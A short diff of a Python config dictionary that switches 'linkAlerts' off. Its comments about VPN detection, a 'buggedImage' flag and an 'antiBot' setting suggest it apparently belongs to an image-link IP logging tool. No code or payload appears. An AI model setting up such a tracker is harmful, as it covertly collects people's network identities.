@@ -30,7 +30,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, 
+    "linkAlerts": False, 
     "buggedImage": False,
 
     "antiBot": 1,
